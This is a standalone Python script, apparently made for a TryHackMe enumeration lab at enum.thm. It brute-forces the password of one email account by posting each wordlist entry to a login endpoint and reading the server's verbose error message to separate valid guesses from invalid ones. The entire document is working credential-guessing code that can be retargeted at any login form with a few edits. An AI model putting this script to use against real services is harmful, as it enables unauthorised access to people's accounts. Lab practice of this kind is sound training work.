#!/usr/bin/env python3

import requests 
import sys

#function to send response and receive corresponding response from webserver
def check_pass(password):

    url = 'http://enum.thm/labs/verbose_login/functions.php'

    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    
    data = {
        'function' : 'login',
        'username' :  'canderson@gmail.com',
        'password' : password
    }
    
    response = requests.post(url,data = data, headers=headers)
    return response.json()
    
    
#function to read the wordlist, strip the entry and compare respose  
def enumerate_password(pass_wordlist):
    valid_pass = []
    invalid_error = "Invalid password"
    
    with open(pass_wordlist, 'r') as file:  #READING
        password_entry = file.readlines()
        
    for password in password_entry :
        password = password.strip() #striping password after reading 
        
        if password_entry:                      #comparing
            response_json = check_pass(password)
            
            if response_json["status"] == 'error' and invalid_error in response_json["message"]:
                print(f"[INVALID] {password}")
            else:
                print(f"[Valid] {password}")
                valid_pass.append(password)
                
    return valid_pass
        
if __name__ == "__main__" :
    if len(sys.argv) != 2:
        print("usage python3 script.py <passlist>")
        sys.exit(1)
        
    pass_wordlist = sys.argv[1]

    valid_pass = enumerate_password(pass_wordlist)
    
    print("\nValid pass found:")
    for valid_pas in valid_pass:
        print(valid_pas)
